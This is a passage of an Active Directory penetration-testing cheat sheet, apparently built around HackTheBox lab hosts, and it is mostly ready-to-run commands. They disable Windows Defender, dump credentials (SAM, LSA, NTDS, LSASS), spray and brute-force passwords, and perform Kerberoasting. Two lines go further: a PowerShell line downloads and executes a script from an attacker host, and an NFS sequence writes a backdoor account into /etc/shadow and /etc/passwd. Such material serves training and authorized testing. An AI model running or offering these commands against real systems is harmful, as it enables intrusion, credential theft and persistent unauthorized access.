Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MpPreference -DisableBehaviorMonitoring $true;Set-MpPreference -DisableBlockAtFirstSeen $true;Set-MpPreference -DisableEmailScanning $true;Set-MpPreference -DisableScriptScanning $true;Set-MpPreference -DisableIOAVProtection $true;Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# Bypassing with path exclusion
Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# PowerShell cmdlet used to view AppLocker policies from a Windows-based host.
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# Checking PowerShell Constrained Language Mode
$ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage

# Checking LAPS
Find-LAPSDelegatedGroups
Find-AdmPwdExtendedRights
Get-LAPSComputers
```

### Credentialed Enumeration

#### From Linux

```bash
# Domain groups
sudo crackmapexec smb 172.16.5.5 -u forend -p '<PASSWORD>' --groups

# Logged-on users and shares
sudo crackmapexec smb 172.16.5.130 -u forend -p '<PASSWORD>' --loggedon-users
sudo crackmapexec smb 172.16.5.5 -u forend -p '<PASSWORD>' --shares
sudo crackmapexec smb 172.16.5.5 -u forend -p '<PASSWORD>' -M spider_plus --share 'Department Shares'
head -n 10 /tmp/cme_spider_plus/172.16.5.5.json

# smbmap
smbmap -u forend -p '<PASSWORD>' -d INLANEFREIGHT.LOCAL -H 172.16.5.5
smbmap -u forend -p '<PASSWORD>' -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only

# rpcclient
rpcclient -U "" -N 172.16.5.5
queryuser 0x457
enumdomusers

# Impacket
psexec.py inlanefreight.local/wley:'<PASSWORD>'@172.16.5.125
wmiexec.py inlanefreight.local/wley:'<PASSWORD>'@172.16.5.5

# windapsearch
python3 windapsearch.py --dc-ip 172.16.5.5 -u <EMAIL> -p '<PASSWORD>' --da
python3 windapsearch.py --dc-ip 172.16.5.5 -u <EMAIL> -p '<PASSWORD>' -PU

# bloodhound-python
sudo bloodhound-python -u 'forend' -p '<PASSWORD>' -ns 172.16.5.5 -d inlanefreight.local -c all
```

References: [BloodHound](https://academy.hackthebox.com/course/preview/active-directory-bloodhound), [WADComs](https://wadcoms.github.io/)

#### From Windows

```powershell
Import-Module ActiveDirectory
Get-Module
Get-ADDomain
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
Get-ADTrust -Filter *
Get-ADGroup -Filter * | select name
Get-ADGroup -Identity "Backup Operators"
Get-ADGroupMember -Identity "Backup Operators"
```

PowerView:

```powershell
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-DomainTrustMapping
Test-AdminAccess -ComputerName ACADEMY-EA-MS01
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

SharpView:

```powershell
.\SharpView.exe Get-DomainUser -Help
.\SharpView.exe Get-DomainUser -Identity forend
```

Snaffler:

```powershell
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data
```

SharpHound:

```powershell
.\SharpHound.exe --help
.\SharpHound.exe -c All --zipfilename ILFREIGHT
```

```shell
sudo apt-get install bloodhound
sudo bloodhound-setup
```

> http://localhost:7474/browser/

```shell
sudo vi /etc/bhapi/bhapi.json
```

```json
  "database": {
    "addr": "localhost:5432",
    "username": "_bloodhound",
    "secret": "<PASSWORD>",
    "database": "bloodhound"
  },
  "neo4j": {
    "addr": "localhost:7687",
    "username": "neo4j",
    "secret": "<PASSWORD>"
  "default_admin": {
    "principal_name": "admin",
    "password": "<PASSWORD>",
    "first_name": "Bloodhound",
    "last_name": "Kali"
```

```shell
sudo bloodhound
```

> http://127.0.0.1:8080/

| Email Address | Password |
| admin | <PASSWORD> |

```shell
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -dc '<RHOST>' -ns '<RHOST>' -c all --zip
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -dc '<RHOST>' -ns '<RHOST>' -c all --zip --dns-timeout 30
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -gc '<DOMAIN>' -ns '<RHOST>' -c all --zip
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -ns '<RHOST>' --dns-tcp -no-pass -c all --zip
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -dc '<RHOST>' -ns '<RHOST>' --dns-tcp -no-pass -c all --zip
bloodhound-python -u <USERNAME>@<DOMAIN> -k -no-pass -d <DOMAIN> -dc <RHOST> -ns <RHOST> -c all --zip
```

> https://github.com/Pennyw0rth/NetExec

> https://www.netexec.wiki/

#### Modules

```shell
netexec smb -L
netexec ldap -L
netexec winrm -L
netexec mssql -L
netexec ssh -L
netexec ftp -L
netexec rdp -L
netexec wmi -L
netexec nfs -L
netexec vnc -L
```

**Authentication**

```shell
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>'
netexec smb <RHOST> -u '<USERNAME>' -H '<HASH>'
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>'
netexec ldap <RHOST> -u '<USERNAME>' -H '<HASH>'
netexec winrm <RHOST> -u '<USERNAME>' -p '<PASSWORD>'
netexec winrm -u /t -p '<PASSWORD>' -d '<DOMAIN>' <RHOST>
netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>'
netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN>
netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth
netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --port <RPORT>
netexec wmi <RHOST> -u '<USERNAME>' -p '<PASSWORD>'
netexec wmi <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN>
netexec wmi <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth
```

#### Null Session

```shell
netexec smb <RHOST> -u '' -p ''
netexec smb <RHOST> -u ' ' -p '<PASSWORD>'
```

#### Guest Account

```shell
netexec smb <RHOST> -u 'Guest' -p ''
```

#### Local Authenitcation

```shell
netexec smb <RHOST> -u '<USERNAME>' --local-auth
```

#### Kerberos

#### Kerberos Authentication

```shell
netexec smb <RHOST> -u '<USERNAME>' --use-kcache
```

#### Generate TGT

```shell
netexec smb <RHOST> -u <USERNAME> -p <PASSWORD> --generate-tgt /PATH/TO/FILE/<FILE>.ccache
netexec smb <RHOST> -u <USERNAME> -k --use-kcache
```

#### Generate krb5.conf

```shell
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --generate-krb5-file ./krb5.conf
export KRB5_CONFIG=./krb5.conf
echo '<PASSWORD>' | kinit <USERNAME>@<DOMAIN>
```

#### Password Spraying

```shell
netexec <PROTOCOL> <RHOST> -u <USERNAME> <USERNAME> <USERNAME> -p <PASSWORD>
netexec <PROTOCOL> <RHOST> -u <USERNAME> <USERNAME> <USERNAME> -p <PASSWORD> --ignore-pw-decoding
netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --continue-on-success
netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --no-bruteforce
netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --no-bruteforce --continue-on-success
```

#### SMB Protocol

#### SMB Share Enumeration

```shell
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>'  --shares
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>'  --shares --dir
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>'  --shares --dir "<FOLDER>"
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>'  --shares --smb-timeout 10
```

#### Download Files

```shell
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares -M spider_plus
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares -M spider_plus -o READ_ONLY=false
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares -M spider_plus -o DOWNLOAD_FLAG=true
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=99999999
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --share <SHARE> --get-file <FILE> <FILE>
```

#### File Handling

```shell
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --get-file \\PATH\\TO\FOLDER\\<FILE> /PATH/TO/FOLDER/<FILE>
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --put-file /PATH/TO/FILE/<FILE> \\PATH\\TO\FOLDER\\<FILE>
```

#### RID Brute Force

```shell
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares --rid-brute
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares --rid-brute 100000
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares --rid-brute | grep 'SidTypeUser' | awk '{print $6}'
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares --rid-brute | grep 'SidTypeUser' | awk '{print $6}'  | awk -F '\\' '{print $2}'
```

#### Vulnerability Scanning

```shell
netexec smb <RHOST> -u '' -p '' -M ms17-010
netexec smb <RHOST> -u '' -p '' -M smbghost
netexec smb <RHOST> -u '' -p '' -M zerologon
netexec smb <RHOST> -u '' -p '' -M badsuccessor
netexec smb <RHOST> -u '' -p '' -M printnightmare
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M nopac
netexec smb <RHOST> -u '' -p '' -M coerce_plus
netexec smb <RHOST> -u '' -p '' -M coerce_plus -o LISTENER=<LHOST>
netexec smb <RHOST> -u '' -p '' -M coerce_plus -o LISTENER=<LHOST> ALWAYS=true
netexec smb <RHOST> -u '' -p '' -M coerce_plus -o METHOD=PetitPotam
```

#### System Enumeration

```shell
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --users
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --users-export <FILE>
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --groups
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-group
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --pass-pol
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --disks
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --smb-sessions
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --loggedon-users
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M powershell_history
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M bitlocker
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M enum_av
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M spooler
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M webdav
```

#### Credentials Dumping

```shell
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --sam
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --lsa
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dpapi
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dpapi cookies
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dpapi nosystem
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --dpapi nosystem
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M eventlog_creds
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_autologin
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_password
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M lsassy
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M nanodump
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M ntdsutil
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M backup_operator
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M putty
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M vnc
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M mremoteng
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M notepad
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M notepad++
```

**Timeroasting**

```shell
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M timeroast
```

**User Handling**

#### Change User Password

```shell
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M change-password -o NEWPASS=<PASSWORD>
```

#### Change Password of a different User

```shell
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M change-password -o USER=<USERNAME> NEWPASS=<PASSWORD>
```

#### Command Execution

```shell
netexec smb <RHOST> -u '<USERNAME>' -H '<HASH>' -x <COMMAND>
netexec smb <RHOST> -u '<USERNAME>' -M pi -o PID=<PID> EXEC=<COMMAND>
```

#### LDAP

#### Domain Enumeration

```shell
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --users
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --users-export <FILE>
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --active-users
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --groups
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --groups "<GROUP>"
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --admin-count
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --query "(adminCount=1)" "sAMAccountName"
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dc-list
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --find-delegation
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M get-desc-users
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M adcs
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M pre2k
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M maq
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M enum_trusts
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M ldap-checker
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M whoami
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M sccm -o REC_RESOLVE=TRUE
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c All
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound --dns-tcp --dns-server <RHOST> -c All
```

#### Find Domain SID

```shell
netexec ldap <RHOST> -u '<USERNAME>' -k --get-sid
```

#### Forest Trust Enumeration

```shell
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> --query '(&(objectClass=trustedDomain)(trustPartner=<DOMAIN>))' 'distinguishedName trustPartner trustDirection trustType trustAttributes securityIdentifier'
```

```python
python3 -c 'v=72; print(f"{v} = {v:#x}"); print([name for bit,name in [(0x1,"NON_TRANSITIVE"),(0x2,"UPLEVEL_ONLY"),(0x4,"QUARANTINED"),(0x8,"FOREST_TRANSITIVE"),(0x10,"CROSS_ORGANIZATION"),(0x20,"WITHIN_FOREST"),(0x40,"TREAT_AS_EXTERNAL"),(0x400,"PIM_TRUST")] if v & bit])'
```

```shell
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> --query '(&(objectClass=group)(objectSid=*))' 'sAMAccountName objectSid memberOf'
```

#### LDAP Queries

```shell
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --query '(sAMAccountName=Administrator)' ''
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --query '(sAMAccountName=Administrator)' 'sAMAccountName objectClass pwdLastSet'
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dns-server <RHOST> --query '(&(objectClass=organizationalUnit)(ou=<OU>))' 'distinguishedName objectGUID'
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dns-server <RHOST> --query '(sAMAccountName=<GROUP>)' 'distinguishedName objectSid member'
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dns-server <RHOST> --query '(sAMAccountName=<USERNAME>)' 'distinguishedName objectSid memberOf'
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M daclread -o TARGET_DN='OU=<OU>,DC=<DOMAIN>,DC=<DOMAIN>' ACTION=read PRINCIPAL=<GROUP>
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M daclread -o TARGET_DN='OU=<OU>,DC=<DOMAIN>,DC=<DOMAIN>' ACTION=read PRINCIPAL=<USERNAME>
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --query '(&(objectClass=user)(sAMAccountName=<USERNAME>))' 'distinguishedName sAMAccountName userPrincipalName userAccountControl pwdLastSet'
```

#### Domain Access Control List (DACL) Enumeration

```shell
netexec ldap -k --kdcHost <RHOST> -M daclread -o TARGET=Administrator ACTION=read
netexec ldap -k --kdcHost <RHOST> -M daclread -o TARGET=Administrator ACTION=read PRINCIPAL=<USERNAME>
netexec ldap -k --kdcHost <RHOST> -M daclread -M daclread -o TARGET_DN="DC=<DOMAIN>,DC=<DOMAIN>" ACTION=read RIGHTS=DCSync
netexec ldap -k --kdcHost <RHOST> -M daclread -M daclread -o TARGET=Administrator ACTION=read ACE_TYPE=denied
netexec ldap -k --kdcHost <RHOST> -M daclread -M daclread -o TARGET=../../<FILE> ACTION=backup
```

**Credentials Dumping**

```shell
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa -k
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-convert-id <ID>
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-decrypt-lsa <ACCOUNT>
```

#### ASREPRoast

```shell
netexec ldap <RHOST> -u '<USERNAME>' -p '' --asreproast hashes.asreproast
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --asreproast hashes.asreproast
netexec ldap <RHOST> -u '<USERNAME>' -p '' --asreproast hashes.asreproast --kdcHost <DOMAIN>
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --asreproast hashes.asreproast --kdcHost <DOMAIN>
```

**Kerberoasting**

```shell
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --kerberoasting hashes.kerberoasting
```

#### Delegation

#### Find Delegation

#### Find Unconstrained Delegation

```shell
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --trusted-for-delegation
```

**Active Directory Certificate Services (AD CS)**

**ESC8: NTLM Relay to AD CS HTTP Endpoints**

```shell
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M adcs -o SERVER=<RHOST>
```

#### WinRM

**Command Execution**

```shell
netexec winrm <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -X <COMMAND>
```

#### MSSQL

**RID Brute Force**

```shell
netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --rid-brute
```

#### Privilege Escalation

```shell
netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M mssql_priv
netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M mssql_priv -o ACTION=privesc
netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M mssql_priv -o ACTION=rollback
```

**Command Execution**

```shell
netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth -x whoami
netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
```

**File Handling**

```shell
netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --get-file \\PATH\\TO\FOLDER\\<FILE> /PATH/TO/FOLDER/<FILE>
netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --put-file /PATH/TO/FILE/<FILE> \\PATH\\TO\FOLDER\\<FILE>
```

#### SSH

**Command Execution**

```shell
netexec ssh <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -x <COMMAND>
```

**File Handling**

```shell
netexec ssh <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --get-file /PATH/TO/FOLDER/<FILE> <FILE>
netexec ssh <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --put-file <FILE> /PATH/TO/FOLDER/<FILE>
```

#### FTP

**File Handling**

```shell
netexec ftp <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ls
netexec ftp <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --get-file <FILE>
netexec ftp <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --put-file <FILE> <FILE>
```

#### RDP

#### Take Screenshot

```shell
netexec rdp <RHOST> --nla-screenshot
netexec rdp <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --screenshot --screentime 3
```

#### WMI

**Command Execution**

```shell
netexec wmi <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -x <COMMAND>
```

#### NFS

**Share Enumeration**

```shell
netexec nfs <RHOST>
netexec nfs <RHOST> --shares
netexec nfs <RHOST> --enum-shares
netexec nfs <RHOST> --share '/var/nfs/general' --ls '/'
```

####### File Handling

```shell
netexec nfs <RHOST> --get-file /PATH/TO/FOLDER/<FILE> <FILE>
netexec nfs <RHOST> --put-file <FILE> /PATH/TO/FOLDER/<FILE>
```

#### Escape to root File System

| Username | Password |
| backdoor | <PASSWORD> |

```shell
netexec nfs <RHOST> --ls '/'
netexec nfs <RHOST> --get-file '/etc/shadow' etc_shadow
netexec nfs <RHOST> --get-file '/etc/passwd' etc_passwd
echo 'backdoor$6$QF0YMBn9$Gj7DTxYtq7ie3zTOSSHrFsp2DpWqTpV0xunqkGxU7UlK8tZkW6zzFNRy8GwsVqYFxflK0zPbAAKQt6VwAhWqsyO:18000:0:99999:7:::' >> etc_shadow
echo 'backdoor:x:1003:1001:,,,:/home/backdoor:/bin/bash' >> etc_passwd
netexec nfs <RHOST> --put-file etc_shadow '/etc/shadow'
netexec nfs <RHOST> --put-file etc_passwd '/etc/passwd'
ssh backdoor@<RHOST>
```

### Living off the Land (Windows)

Basic host and domain enumeration using only built-in Windows binaries.

#### Basic Host Enumeration

```cmd
hostname
[System.Environment]::OSVersion.Version
wmic qfe get Caption,Description,HotFixID,InstalledOn
ipconfig /all
set
echo %USERDOMAIN%
echo %logonserver%
```

#### PowerShell Enumeration

```powershell
Get-Module
Get-ExecutionPolicy -List
Set-ExecutionPolicy Bypass -Scope Process
Get-ChildItem Env: | ft Key,Value
Get-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Get-Host

# Download and execute in memory
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://<ATTACKER>/script.ps1'); <follow-on commands>"
```

#### Firewall & Defender Checks

```cmd
netsh advfirewall show allprofiles
sc query windefend
```

```powershell
Get-MpComputerStatus
```

#### Logged-on Users

```cmd
qwinsta
```

#### Network Information

```cmd
arp -a
ipconfig /all
route print
netsh advfirewall show allprofiles
```

#### WMI Enumeration

```cmd
wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
```

Reference: <https://gist.github.com/xorrior/<NTLM_HASH>>

#### Net Commands

| Command | Description |
|---|---|
| `net accounts` | Password requirements |
| `net accounts /domain` | Password and lockout policy |
| `net group /domain` | Domain groups |
| `net group "Domain Admins" /domain` | Users with Domain Admin privileges |
| `net group "Domain Computers" /domain` | Computers joined to the domain |
| `net group "Domain Controllers" /domain` | Domain controller accounts |
| `net group <group> /domain` | Members of a domain group |
| `net localgroup` | All available local groups |
| `net localgroup Administrators` | Members of the local Administrators group |
| `net localgroup administrators <user> /add` | Add a user to the local Administrators group |
| `net share` | Current shares |
| `net user <account> /domain` | Information about a domain user |
| `net user /domain` | All domain users |
| `net user %username%` | Information about the current user |
| `net use x: \\computer\share` | Mount a share locally |
| `net view` | List computers |
| `net view /all /domain[:domain]` | Shares in the domain |
| `net view \\computer /ALL` | Shares on a computer |
| `net view /domain` | Computers in the domain |

> If `net` is blocked or monitored, try `net1` instead.

#### Dsquery

```cmd
dsquery user
dsquery computer
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```

Reference: <https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754232(v=ws.11)>

### Kerberoasting

```
# Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (-outputfile sqldev_tgs) linux-based host.
	impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs

# Enumerating SPNs with setspn.exe
setspn.exe -Q */*

# PowerShell script used to download/request the TGS ticket of a specific user from a Windows-based host.
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

# Retrieving All Tickets Using setspn.exe
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

# Mimikatz command that ensures TGS tickets are extracted in base64 format from a Windows-based host.
mimikatz # base64 /out:true

# Mimikatz command used to extract the TGS tickets from a Windows-based host.
kerberos::list /export

# Used to prepare the base64 formatted TGS ticket for cracking from Linux-based host.
echo "<base64 blob>" | tr -d \\n

# Used to output a file (encoded_file) into a .kirbi file in base64 (base64 -d > sqldev.kirbi) format from a Linux-based host.
cat encoded_file | base64 -d > sqldev.kirbi

# Used to extract the Kerberos ticket. This also creates a file called crack_file from a Linux-based host.
python2.7 kirbi2john.py sqldev.kirbi

# Used to modify the crack_file for Hashcat from a Linux-based host.
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat

# Uses PowerView tool to extract TGS Tickets . Performed from a Windows-based host.
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname

# PowerView tool used to download/request the TGS ticket of a specific ticket and automatically format it for Hashcat from a Windows-based host.
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes --> checking support encryption types.

# Used to request/download a TGS ticket for a specific user (/user:testspn) the formats the output in an easy to view & crack manner (/nowrap). Performed from a Windows-based host.
.\Rubeus.exe kerberoast /user:testspn /nowrap
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# Cracking Kerberos ticket hash
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force

```

> https://gist.github.com/TarlogicSecurity/<NTLM_HASH>

#### General Notes

- Golden Ticket is a Ticket Granting Ticket (TGT) and completely forged offline (KRBTGT Account Hash needed).
- Silver Ticket is a forged service authentication ticket (Service Principal Name (SPN) and Machine Account Keys (Hash in RC4 or AES) needed). Silver Tickets do not touch the Domain Controller (DC).
- Diamond Ticket is essentially a Golden Ticket but requested from a Domain Controller (DC).

#### Bruteforce

```shell
./kerbrute -domain <DOMAIN> -users <FILE> -passwords <FILE> -outputfile <FILE>
```

#### With List of Users

```cmd
.\Rubeus.exe brute /users:<FILE> /passwords:<FILE> /domain:<DOMAIN> /outfile:<FILE>
```

#### Check Passwords for all Users in Domain

```cmd
.\Rubeus.exe brute /passwords:<FILE> /outfile:<FILE>
```

#### ASPREPRoast

#### Check ASPREPRoast for all Domain Users (Credentials required)

```shell
impacket-GetNPUsers <DOMAIN>/<USERNAME>:<PASSWORD> -request -format hashcat -outputfile <FILE>
impacket-GetNPUsers <DOMAIN>/<USERNAME>:<PASSWORD> -request -format john -outputfile <FILE>
```

#### Check ASPREPRoast for a List of Users (No Credentials required)

```shell
impacket-GetNPUsers <DOMAIN>/ -usersfile <FILE> -format hashcat -outputfile <FILE>
impacket-GetNPUsers <DOMAIN>/ -usersfile <FILE> -format john -outputfile <FILE>
```

#### Check ASPREPRoast for all Domain Users in Domain

```cmd
